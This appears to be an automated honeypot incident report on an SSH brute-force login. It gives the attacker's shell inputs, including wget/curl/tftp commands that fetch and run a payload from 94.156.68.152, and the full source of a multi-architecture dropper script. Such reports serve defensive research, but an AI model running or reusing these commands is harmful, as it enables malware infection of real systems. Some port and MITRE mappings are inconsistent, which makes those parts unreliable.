1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 

```

</details>

---


<details>
<summary>
<h1>IP and Ports</h1>
</summary>

The IP address and ports involved in the attack are as follows:

- Attacker's IP Address: 204.76.203.13
- Honeypot's IP Address: 172.31.5.68
- Attacker's Source Ports: 56388, 56398, 56402, 54312, 54330
- Honeypot's Destination Port: 2222

<details>
<summary>
<h3>Top 1 Source Ips</h3>
</summary>

Total Source IPs: `5`
Unique: `1`

| Source IP | Times Seen |
| --- | --- |
| `204.76.203.13` | `5` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ips</h3>
</summary>

Total Destination IPs: `5`
Unique: `1`

| Destination IP | Times Seen |
| --- | --- |
| `172.31.5.68` | `5` |

</details>

---


<details>
<summary>
<h3>Top 5 Source Ports</h3>
</summary>

Total Source Ports: `5`
Unique: `5`

| Source Port | Times Seen |
| --- | --- |
| `56388` | `1` |
| `56398` | `1` |
| `56402` | `1` |
| `54312` | `1` |
| `54330` | `1` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ports</h3>
</summary>

Total Destination Ports: `5`
Unique: `1`

| Destination Port | Times Seen |
| --- | --- |
| `2222` | `5` |

</details>

---


</details>

---


<details>
<summary>
<h1>SSH Analysis</h1>
</summary>

The SSH data obtained from the attack on the honeypot indicates the following:

- The attacker used a client with an SSH Hassh value of `63ae64767f334c6a74647d80edb0291e`. An SSH Hassh is a fingerprint that identifies the client software's SSH implementation, which can be helpful in identifying the client software used by the attacker or associating the attack with other attacks using the same client.

- The SSH version used by the attacker is `SSH-2.0-libssh2_1.10.0`. This suggests that the attacker employed a client that is built using the `libssh2` library, version `1.10.0`. 

This information might be useful in profiling the attacker's tools and methods. Additionally, the specific SSH Hassh and version could be cross-referenced with threat intelligence databases to determine if this fingerprint has been seen in other known attacks or if associated with particular threat actors.

<details>
<summary>
<h3>Top 3 Usernames</h3>
</summary>

Total Usernames: `5`
Unique: `3`

| Username | Times Seen |
| --- | --- |
| `admin` | `3` |
| `ubnt` | `1` |
| `root` | `1` |

</details>

---


![Username](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-usernames.png)
<details>
<summary>
<h3>Top 5 Passwords</h3>
</summary>

Total Passwords: `5`
Unique: `5`

| Password | Times Seen |
| --- | --- |
| `admin` | `1` |
| `password` | `1` |
| `ubnt` | `1` |
| `123456` | `1` |
| `root` | `1` |

</details>

---


![Password](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-passwords.png)
<details>
<summary>
<h3>Top 5 Username/Password Pairs</h3>
</summary>

Total Username/Password Pairs: `5`
Unique: `5`

| Username/Password Pair | Times Seen |
| --- | --- |
| `('admin', 'admin')` | `1` |
| `('admin', 'password')` | `1` |
| `('ubnt', 'ubnt')` | `1` |
| `('admin', '123456')` | `1` |
| `('root', 'root')` | `1` |

</details>

---


![Username/Password Pair](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-login_pairs.png)
<details>
<summary>
<h3>Top 1 Successful Usernames</h3>
</summary>

Total Successful Usernames: `1`
Unique: `1`

| Successful Username | Times Seen |
| --- | --- |
| `root` | `1` |

</details>

---


![Successful Username](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-successful_usernames.png)
<details>
<summary>
<h3>Top 1 Successful Passwords</h3>
</summary>

Total Successful Passwords: `1`
Unique: `1`

| Successful Password | Times Seen |
| --- | --- |
| `root` | `1` |

</details>

---


![Successful Password](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-successful_passwords.png)
<details>
<summary>
<h3>Top 1 Successful Username/Password Pairs</h3>
</summary>

Total Successful Username/Password Pairs: `1`
Unique: `1`

| Successful Username/Password Pair | Times Seen |
| --- | --- |
| `('root', 'root')` | `1` |

</details>

---


![Successful Username/Password Pair](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-successful_login_pairs.png)
<details>
<summary>
<h3>Top 1 Ssh Versions</h3>
</summary>

Total SSH Versions: `5`
Unique: `1`

| SSH Version | Times Seen |
| --- | --- |
| `SSH-2.0-libssh2_1.10.0` | `5` |

</details>

---


![SSH Version](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-ssh_versions.png)
<details>
<summary>
<h3>Top 1 Ssh Hasshs</h3>
</summary>

Total SSH Hasshs: `5`
Unique: `1`

| SSH Hassh | Times Seen |
| --- | --- |
| `63ae64767f334c6a74647d80edb0291e` | `5` |

</details>

---


![SSH Hassh](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-ssh_hasshs.png)
</details>

---


# Commands Used
This attack used a total of `9` inputs to execute the following `17` commands:
The commands used in the attack can provide clues about the attacker's intentions and methods. Let's go through each unique command and its function in the context of the attack:

1. `enable`: In the context of some network devices, this command may be used to enter privileged EXEC mode. It is likely a guess to elevate privileges.
2. `system`: Typically part of a broader command in various environments, it may be used to execute system calls from a shell. Without additional context, it's unclear what the intention was.
3. `shell`, `sh`, `linuxshell`: These commands attempt to invoke a system shell. The attacker is likely trying to gain shell access to execute arbitrary commands on the system.
4. `cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai`: This sequence of commands changes the current directory to /tmp, writes the text "senpai" to a file named `rootsenpai`, displays the content of this file, and then removes it. This is likely a test to confirm that the attacker can write and delete files on the system.
5. `for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;`: This script searches through process directories in `/proc` for any mapped files marked as deleted, and then kills the associated process using `kill -9`. This action could disrupt certain system functions or security software that may be monitoring the infected files.
6. `rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah; ./ah ssh; rm -rf ah`: This is a multi-faceted command that initially attempts to remove any existing file named `ah`. It then tries to download a file called `ah` from `http://94.156.68.152` using different methods (`wget`, `curl`, and `tftp`). Once downloaded, it changes the permissions of the file to be executable by anyone (`chmod 777`), executes the file with an argument `ssh`, and finally removes the file. This command is a clear indicator of an attempt to download and execute malware from a remote server.
7. `basename $dir`: This command by itself is intended to strip the directory path and print the filename portion of the given path. It was possibly used in scripting during the attack.

Overall, the attacker tried to establish a shell, test file operations, potentially stop processes that may interfere with their activities, and download and execute a malicious file. The various download methods indicate a thorough approach to ensuring the malware is retrieved, even if certain commands (like `wget` or `curl`) are unavailable or blocked on the target system. The removal of the file after execution suggests an attempt to cover tracks.

<details>
<summary>
<h2>Raw Command Inputs</h2>
</summary>

The attacker entered the following `9` inputs on the honeypot system:

**Input 1:**
```bash
enable
```

**Input 2:**
```bash
system
```

**Input 3:**
```bash
shell
```

**Input 4:**
```bash
sh
```

**Input 5:**
```bash
linuxshell
```

**Input 6:**
```bash
cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
```

**Input 7:**
```bash
for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
```

**Input 8:**
```bash
basename $dir
```

**Input 9:**
```bash
basename $dir
```

</details>

---


<details>
<summary>
<h2>Commands Explained</h2>
</summary>

The following `17` commands were executed on the honeypot system:

```bash
enable
system
shell
sh
```
These commands (`enable`, `system`, `shell`, `sh`, `linuxshell`) appear to be an attempt to **gain privileged shell access** on the device. The context and effectiveness depend on the specific device/system and whether those commands are valid. They could be targeting a Cisco IOS-like CLI (`enable`, `system`) or attempting various common command names (`shell`, `sh`, `linuxshell`) to drop into a Unix shell.
```bash
cd /tmp/
```
The attacker **changes the current working directory** to `/tmp/`, which is typically writable by any user and often used for temporary file storage during such attacks.
```bash
echo "senpai" > rootsenpai
```
The attacker executes `echo` to **create a file** with the content `senpai` and names it `rootsenpai` in the `/tmp/` directory. With `cat`, they **display the contents** of the created file, likely to confirm that the file write operation was successful.
```bash
rm -rf rootsenpai
```
The attacker **deletes the file** `rootsenpai` from the `/tmp/` directory, possibly to cover their tracks or because the file was just for a test.
```bash
for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;
```
This command is a **for loop** that searches through the directories representing processes in `/proc/` for files named `maps`. It looks for strings containing `"(deleted)"`, which would indicate a memory-mapped file that has been deleted but is still in use. If found, it reports the finding and **kills the associated process** using its PID (`kill -9 $(basename $dir)`). This may be intended to disrupt certain processes, perhaps to evade detection, free a file lock, or affect the system's behavior.
```bash
rm -rf ah
```
After executing their payload, the attacker **removes the file** `ah`, again likely to cover their tracks.
```bash
wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152
```
The attacker uses multiple methods (`wget`, `curl`, `tftp`) to **download a file** named `ah` from a remote server with the IP address `94.156.68.152`. This shows redundancy in their approach, ensuring at least one method succeeds if others are blocked or unavailable.
```bash
chmod 777 ah
```
Upon successful download, the attacker uses `chmod` to set all permissions (`777`) for the file `ah`, allowing any user to **execute, read, or write the file**.
```bash
./ah ssh
```
The attacker **executes** the downloaded file `ah` with the argument `ssh`, which might indicate that this is a custom script or binary intended to establish an SSH connection or manipulate SSH service/key files.
```bash
basename $dir
```
These commands use `basename`, which **strips the directory portion from a given path**, and returns only the name of the file. However, as they are standalone, they are likely **mistyped commands** or part of a script that was not copied in full.
</details>

---



# Malware OSINT

Based on the provided information and data from OSINT sources, here is what we know about the attack and the associated malware:

### Attacker Details
- **Source IP:** 204.76.203.13
- **Location:** Saint Kitts and Nevis
- **Network:** Intelligence Hosting LLC, AS Unknown
- **ISP:** Data Center/Web Hosting/Transit
- **Risk Level:** High (100% according to AbuseIPDB)
- **Attack Reports:**
  - GreyNoise: Last reported on 03 December 2023 as malicious, scanning in the last 3 months.
  - MetaDefender: High risk, associated with bruteforce, scanner activities.
  - AbuseIPDB: 1354 reports by 646 users, last on 04 December 2023.
  - Pulsedive: Medium risk, last seen on 29 November 2023, known for SSH Brute Force.
  - ISC: 2 reports listing 1 target, last on 3 December 2023.
  - Blocklist.de: Multiple listings for attacks and reports.
- **ISC Report:** Total reports - 2, Honeypots targeted - 1. AS Name: INTELLIGENCE-ATOM-HOSTING.

### Malware Details
- **Malware Hashes:**
  - fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054
  - 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8
- MalwareBazaar and ThreatFox did not return any information on these hashes.

### Malicious URLs and Hosts Found in the Malware
- **URLs:** `http://94.156.68.152`
- **Hosts:** 94.156.68.152
- No further details were available from URLhaus about this URL or host.

### Malpedia
- Without specific malware names, we cannot query Malpedia for detailed descriptions.

In summary, the attacker originates from an IP address that has been reported as highly malicious with a wide range of nefarious activities including scanning, brute force, and related risks. While both malware hashes used in the attack have been identified, there is a lack of detailed information regarding these malware samples from MalwareBazaar, ThreatFox, and URLhaus. However, a URL (`http://94.156.68.152`) was extracted from one of these malware, indicating a potential command and control server or a source for additional malicious payloads.

Considering the lack of specific details on the malware from the provided sources, further investigation, possibly by looking into the malware samples directly or using additional threat intelligence services, would be necessary to understand their capabilities and impact.

# Malware Analysis

The malware functions identified in the context of the attack are as follows:

1. **Malware Sample 1:**
   - **SHA256 Hash:** `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`
   - **Source Address:** `http://94.156.68.152/ah`
   - **File Size:** 418 bytes
   - **MIME Type:** `text/plain`
   - **Script Functionality:** This malware sample contains a script that iterates over a list of binary names (likely corresponding to different CPU architectures). For each binary, it attempts to delete any pre-existing instances on the infected system. The script then tries to download a binary from `94.156.68.152/bins/` corresponding to the architecture, using `wget`, `curl`, and `tftp` as potential download methods. After downloading, it changes the permissions of the binary to allow execution (`chmod 777`), attempts to execute the binary with a given argument (`$1`), and finally deletes the binary to cover its tracks.

2. **Malware Sample 2:**
   - **SHA256 Hash:** `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`
   - **Destination File:** `/tmp/rootsenpai`
   - **File Size:** 7 bytes
   - **MIME Type:** `text/plain`
   - **Script Functionality:** This simple text file contains the word `senpai` and does not appear to contain an active malware component. Instead, it seems to be used as a marker or flag within the file system, possibly for verification that the attacker has write access or as a way to signal other components of the attack.

In the context of the attack, the first malware plays a substantial role by handling the downloading and execution of further payloads tailored for various architectures, indicating a level of sophistication and the intent to infect a wide range of systems. The second file appears to be a passive element, potentially part of a multi-stage infection process or a component of an attack toolkit used for confirming successful access or further actions. The overall function of these malware samples suggests a complex attack that potentially delivers architecture-specific payloads to compromised systems and employs evasion techniques to avoid detection.
This attack downloaded `2` raw malware samples which can be standardized into `2` samples:

### Raw Malware Samples

<details>
<summary>
<h4>Raw Malware Sample 0/2 Sha256 HASH: fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054</h4>
</summary>

**Standardized** Sha256 HASH: `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`

**Sample Below** Sha256 HASH: `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`
```bash
binarys="jklmips jklmpsl jklarm jklarm5 jklarm6 jklarm7 jklx86 jklppc jklspc jklm68k"
server_ip="94.156.68.152"
output="vh"

for arch in $binarys
do
rm -rf $arch
rm -rf $output
wget http://$server_ip/bins/$arch -O $output || curl -o $output http://$server_ip/bins/$arch || tftp -g -l $output -r $arch $server_ip || tftp $server_ip -c get $arch -l $output
chmod 777 $output
./$output $1
rm -rf $arch
rm -rf $output
done
```
1 more samples with the same **Standardized** Sha256 HASH were found:

* `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`


</details>

---


<details>
<summary>
<h4>Raw Malware Sample 1/2 Sha256 HASH: 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8</h4>
</summary>

**Standardized** Sha256 HASH: `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`

**Sample Below** Sha256 HASH: `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`
```Unknown
senpai

```
1 more samples with the same **Standardized** Sha256 HASH were found:

* `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`


</details>

---


### Commented Malware Samples & Explanations

<details>
<summary>
<h4>
Standardized Malware Sample 0/2 Sha256 HASH: fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054</h4>
</summary>


```bash
# The following shell script defines a list of binary names and sets server IP details and output file name.
binarys="jklmips jklmpsl jklarm jklarm5 jklarm6 jklarm7 jklx86 jklppc jklspc jklm68k"
server_ip="94.156.68.152"
output="vh"

# Iterate through each binary.
for arch in $binarys
do
    # Remove any existing instances of the binary and output file.
    rm -rf $arch
    rm -rf $output
    
    # Attempt to download the binary from the server using wget, curl or tftp.
    wget http://$server_ip/bins/$arch -O $output || curl -o $output http://$server_ip/bins/$arch || tftp -g -l $output -r $arch $server_ip || tftp $server_ip -c get $arch -l $output
    
    # Make the downloaded file executable.
    chmod 777 $output
    
    # Execute the downloaded file, passing any arguments supplied to the script.
    ./$output $1
    
    # Clean up: remove the binary and output file.
    rm -rf $arch
    rm -rf $output
done
```

</details>

---

This shell script appears to be a multi-architecture malware dropper. It systematically attempts to download and execute payloads from a remote server for various architectures, meaning it is designed to infect different types of Linux systems (e.g., MIPS, ARM, x86). Here's a breakdown of what the script does:

1. It defines a series of binary names which are presumably tailored for specific system architectures.
2. It sets a server IP address, from which the malware will be downloaded. In this case, the IP is `94.156.68.152`.
3. It sets an output file name, `vh`, which will be used for the downloaded binary.
4. It uses a for-loop to iterate through the list of binary names.
5. For each architecture, it first removes any previous instances of the binary or output file.
6. It then proceeds to use `wget`, `curl`, or `tftp` commands to download the corresponding binary from `http://94.156.68.152/bins/$arch`. If one method fails, it falls back to the next method.
7. Upon successfully downloading the file, it changes the permission of the downloaded file to make it executable by any user (`chmod 777`).
8. It then executes the potentially malicious binary, passing through any script arguments (`$1`).
9. Finally, it removes the binary and the output file, most likely in an attempt to hide its tracks.

The attacker executed commands that suggest they gained a shell on the system (`system`, `shell`, `sh`, `linuxshell`), changed to the `/tmp/` directory implying they intend to carry out operations in a directory that doesn't require special permissions, and finally, executed this shell script (`wget`ing it, making it executable, running it, and then removing it).
The use of `rm` commands prior to downloading ensures that no remnants of previous activity impede the malware installation, and the iteration through all possible architectures increases the chances that the malware will successfully execute on the target system. The use of different downloading mechanisms (`wget`, `curl`, `tftp`) shows the attacker's intention to succeed even in environments with limited downloading utilities.

<details>
<summary>
<h4>
Standardized Malware Sample 1/2 Sha256 HASH: 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8</h4>
</summary>


```Unknown
# This line is not valid Python code and appears to be more like a placeholder or marker.
senpai

```

</details>

---

The 'malware_source_code' provided is simply a string with the word 'senpai'. This is not valid Python code, nor does it represent any functional malware script by itself. It looks more akin to a placeholder or a marker which seems to have no impact or relation with the sequence of commands provided. It's unclear what 'senpai' stands for, and if it has any significance within the context of the commands executed on the honeypot system.

In contrast, if we turn our attention to the 'commands' field, it appears to outline a sequence of actions taken on the Linux honeypot system. This sequence suggests that the attacker gained system access, moved to a temporary directory, created a file named 'rootsenpai', used that file or checked its content, and then removed it. Furthermore, they attempted to remove processes related to deleted files, likely in an attempt to conceal their activities. They also attempted to download an external file named 'ah' from a specific IP using multiple methods (wget, curl, tftp) and then made that file executable with full permissions (chmod 777). The attacker then executed 'ah' with the argument 'ssh' and finally removed the 'ah' file.

The 'commands' field suggests the attacker was engaging in behavior typically associated with maintaining access to the system, executing payloads, and attempting to cover their tracks. The keyword 'senpai' may be a codeword or trigger word within the context of this specific threat actor's operations or simply a benign string with no associated functionality.


# Which vulnerability does the attack attempt to exploit?
The commands and malware script provided in the information do not directly indicate exploitation of any specific known vulnerabilities or use any common exploit names or CVE identifiers. Instead, the attack appears to be using generic methods to gain shell access, execute arbitrary commands, and download and run malicious payloads.

Given the available data, here are some possible attack vectors and vulnerabilities that might be exploited based on the attacker's approach:

1. **Weak Credentials:** The attacker could be exploiting systems with weak or default credentials, particularly for SSH services, as indicated by the inclusion of SSH Brute Force in threat lists.

2. **Misconfigured Services:** The attacker may exploit services that are poorly configured or have unnecessarily open permissions. The use of commands like `chmod 777` suggests the attacker is trying to exploit lax file permissions to execute downloaded files.

3. **Unpatched or Vulnerable Software:** The generic download and execute approach taken by the malware could succeed on systems that are running unpatched software vulnerable to remote code execution or other exploit types.

4. **Process Injection or Unauthorized Process Termination:** The command to kill processes based on the presence of (deleted) in `/proc/[0-9]*/maps` might indicate an attempt to disrupt security processes or other protections that might interfere with the malware's execution.

While the specific CVE numbers or exploit names are not provided, and the data does not directly cite any vulnerabilities being targeted, attackers often combine such generic techniques with scanning for known vulnerabilities on exposed services (e.g., CVE's associated with web servers, databases, or network infrastructure). Proactive patching, strong credential policies, access controls, and continuous monitoring are essential defenses against this class of attack.


# MITRE ATT&CK
The MITRE ATT&CK framework is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. Using the information provided about the attack, we can classify the attack behavior according to relevant MITRE ATT&CK tactics and techniques:

1. **Initial Access [TA0001]:**
   - **Technique T1190: Exploit Public-Facing Application** - The attacker may have initially used brute-force attacks to exploit SSH services.

2. **Execution [TA0002]:**
   - **Technique T1059: Command and Scripting Interpreter** - The attacker executed multiple commands and scripts to test capabilities, download, and execute malware.

3. **Persistence [TA0003]:**
   - **Technique T1037: Boot or Logon Initialization Scripts** - The attacker could be aiming to establish persistence through downloaded malware that might manipulate system scripts on boot or logon.

4. **Privilege Escalation [TA0004]:**
   - **Technique T1068: Exploitation for Privilege Escalation** - Techniques like killing processes and changing file permissions indicate attempts to elevate privileges.

5. **Defense Evasion [TA0005]:**
   - **Technique T1083: File and Directory Discovery** and **T1107: File Deletion** - The samples make and remove files in /tmp to check for access and to clean up after executing payloads.
   - **Technique T1055: Process Injection** - The attacker's command to search "/proc/[0-9]*/maps" and kill processes might be an attempt to disable security processes.

6. **Credential Access [TA0006]:**
   - **Technique T1110: Brute Force** - Inferred from the inclusion of the host in threat lists for SSH Brute Force attacks.

7. **Discovery [TA0007]:**
   - **Technique T1082: System Information Discovery** - By using `echo`, `cat`, etc., the attacker may be surveying the system's capability to handle file operations.

8. **Lateral Movement [TA0008]:**
   - **Technique T1021: Remote Services** - The attacker used remote services like SSH for controlling the system and possibly moving laterally in the network.

9. **Command and Control [TA0011]:**
   - **Technique T1071: Application Layer Protocol** - The URLs found in the malware script and download commands suggest a method for command and control activity and malware distribution.

10. **Impact [TA0040]:**
    - **Technique T1485: Data Destruction** - The command that searches for and kills processes may be an attempt to disrupt normal operations or security features.

Each of these elements of the MITRE ATT&CK framework can be used to understand the nature of the attack, determine appropriate countermeasures, and track similar attack patterns in the future.

# What Is The Goal Of The Attack?
Based on the analysis of the commands and malware related to the attack, the goals of the attacker appear to include the following:

1. **Gaining Unauthorized Access:** The use of SSH brute force techniques suggests the attacker's initial goal is to gain unauthorized access to the system, likely by exploiting weak or default credentials.

2. **Establishing a Foothold:** By downloading and executing a script that tries to fetch additional binaries for various architectures, the attacker seems to be attempting to establish a foothold on the compromised system for further exploitation.

3. **Executing Arbitrary Code:** The attacker has demonstrated the ability to execute arbitrary commands and scripts, which would allow them to perform a variety of actions on the target system, depending on their intentions.

4. **Privilege Escalation:** The execution of commands to change file permissions and possibly stop processes indicates an attempt to elevate privileges on the system.

5. **Bypassing Defenses:** The efforts to delete files and to disrupt security processes suggest that the attacker is trying to evade detection and disable security measures.

6. **Command and Control (C2) Communications:** By utilizing specific URLs and IP addresses as part of the attack, the attacker may be setting up a communication channel to a remote server for command and control, thus maintaining persistent access to the system.

7. **Lateral Movement:** The attacker might also seek to move laterally within the network to access other systems and potentially escalate the impact of the attack.

8. **Exfiltrating Data:** Although not explicitly indicated, many attacks of this nature also aim to steal sensitive information or data from the compromised system.

9. **Disruption or Destruction:** The attacker might aim to disrupt operations or destroy data as indicated by attempts to kill processes, which could potentially include critical system or security applications.

Overall, the goals of the attack seem multi-faceted, with potential intentions ranging from establishing persistent access and surveillance to disrupting operations and performing malicious actions that could lead to data theft or damage.

# If The System Is Vulnerable, Would The Attack Will Be Successful?
The success of the attack depends on several factors related to the system's vulnerabilities and the security controls in place. If the system is vulnerable in the following ways, then the attack as described could very likely be successful:

